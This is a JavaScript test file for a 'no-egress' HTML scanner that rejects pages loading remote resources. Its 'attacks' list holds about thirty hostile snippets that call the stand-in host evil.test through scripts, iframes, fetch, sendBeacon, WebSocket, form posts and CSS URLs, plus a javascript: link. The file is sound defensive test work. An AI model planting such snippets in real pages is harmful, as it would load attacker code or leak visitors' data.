import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { fixtures } from "../fixtures/v10_industries.mjs";
import { renderPreview } from "../scripts/arc_contract.mjs";
import { assertNoRemoteRuntimeDependencies } from "../scripts/no_egress_contract.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const template = await readFile(path.join(root, "ARC_MASTER_TEMPLATE.html"), "utf8");
const receiptUrl = "https://arcwebhq-cpu.github.io/arc-previews/ironwood-deadbeef/assets/" + "a".repeat(64) + ".jpg";
const exactReceiptUrls = [receiptUrl];

const rendered = renderPreview(template, fixtures[0].content, {
  trustedEventPrefix: fixtures[0].id,
  customerEmail: fixtures[0].customerEmail,
  paymentLinkUrl: "https://buy.stripe.com/test_00000000000000",
  checkoutBindingSecret: "arc-test-checkout-binding-secret-32-bytes-minimum",
  leadNotificationEmail: fixtures[0].customerEmail,
  leadRouteEvidenceSecret: "arc-test-lead-route-evidence-secret-32-bytes-minimum"
});
assert.equal(assertNoRemoteRuntimeDependencies(rendered.html), true, "rendered no-upload preview is not zero-egress");
assert.ok(template.includes("connect-src 'none'; media-src 'none';") && template.includes("manifest-src 'none'"),
  "preview CSP is not no-egress");
assert.match(template, /ARC_COMPOSITION_MANIFEST_START v10\.1/, "local composition manifest marker missing");
assert.match(template, /data-arc-media-provider="local-css"/, "local CSS provenance marker missing");
assert.doesNotMatch(template, /mediaPresets|images\.(?:unsplash|pexels)\.com|arcsites\.netlify\.app\/assets\/showcases/i,
  "runtime stock catalog or remote media URL remains");

const allowed = `<!doctype html><html><head><style>body{background:linear-gradient(#111,#222)}</style></head><body>
<a href="https://example.test/read">External navigation</a><a href="mailto:hello@example.test">Email</a>
<form action="/?submitted=1"><picture><source srcset="${receiptUrl} 720w"><img src="${receiptUrl}" alt="Customer upload"></picture></form>
<script type="application/ld+json">{"@context":"https://schema.org","@type":"LocalBusiness"}</script></body></html>`;
assert.equal(assertNoRemoteRuntimeDependencies(allowed, { exactReceiptUrls }), true, "signed upload or navigation allowance regressed");

const attacks = [
  ["unsigned image", '<img src="https://evil.test/track.png">'],
  ["mutated receipt URL", `<img src="${receiptUrl}?variant=tracking">`],
  ["remote script", '<script src="https://evil.test/app.js"></script>'],
  ["remote stylesheet", '<link rel="stylesheet" href="https://evil.test/app.css">'],
  ["remote preload", '<link rel="preload" href="https://evil.test/font.woff2">'],
  ["remote icon", '<link rel="icon" href="https://evil.test/icon.png">'],
  ["remote manifest", '<link rel="manifest" href="https://evil.test/site.webmanifest">'],
  ["remote iframe", '<iframe src="https://evil.test/frame"></iframe>'],
  ["remote object", '<object data="https://evil.test/file"></object>'],
  ["remote embed", '<embed src="https://evil.test/file">'],
  ["remote audio", '<audio src="https://evil.test/audio.mp3"></audio>'],
  ["remote video poster", '<video poster="https://evil.test/poster.jpg"></video>'],
  ["remote source", '<source src="https://evil.test/video.mp4">'],
  ["remote track", '<track src="https://evil.test/captions.vtt">'],
  ["CSS URL", '<style>.x{background:url(https://evil.test/pixel.png)}</style>'],
  ["CSS import", '<style>@import "https://evil.test/app.css";</style>'],
  ["style attribute URL", '<div style="background:url(https://evil.test/pixel.png)"></div>'],
  ["remote form", '<form action="https://evil.test/collect"></form>'],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.test/">'],
  ["base URL", '<base href="https://evil.test/">'],
  ["script fetch", '<script>fetch("https://evil.test/")</script>'],
  ["XHR", '<script>new XMLHttpRequest()</script>'],
  ["WebSocket", '<script>new WebSocket("wss://evil.test")</script>'],
  ["EventSource", '<script>new EventSource("https://evil.test/events")</script>'],
  ["sendBeacon", '<script>navigator.sendBeacon("https://evil.test/", "x")</script>'],
  ["service worker", '<script>navigator.serviceWorker.register("/sw.js")</script>'],
  ["importScripts", '<script>importScripts("https://evil.test/a.js")</script>'],
  ["Image constructor", '<script>new Image()</script>'],
  ["dynamic src", '<script>node.src="https://evil.test/a.js"</script>'],
  ["dynamic setAttribute", '<script>node.setAttribute("src", value)</script>'],
  ["javascript navigation", '<a href="javascript:alert(1)">Bad</a>'],
  ["protocol-relative navigation", '<a href="//evil.test/path">Bad</a>']
];
for (const [label, html] of attacks) {
  assert.throws(
    () => assertNoRemoteRuntimeDependencies(html, { exactReceiptUrls }),
    /ARC_REMOTE_DEPENDENCY_INVALID/,
    `zero-egress scanner accepted ${label}`
  );
}

console.log(`ARC no-egress contract passed: ${attacks.length} remote-resource and executable-network attacks rejected.`);
